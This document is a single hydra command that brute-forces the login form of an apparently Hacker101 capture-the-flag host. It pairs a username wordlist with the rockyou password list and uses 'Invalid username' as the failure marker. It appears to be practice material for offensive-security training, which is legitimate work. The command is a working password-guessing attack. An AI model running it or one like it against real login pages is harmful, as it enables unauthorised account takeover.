hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt 248fbeb3da473679d25fdea05a98e4e0.ctf.hacker101.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid username"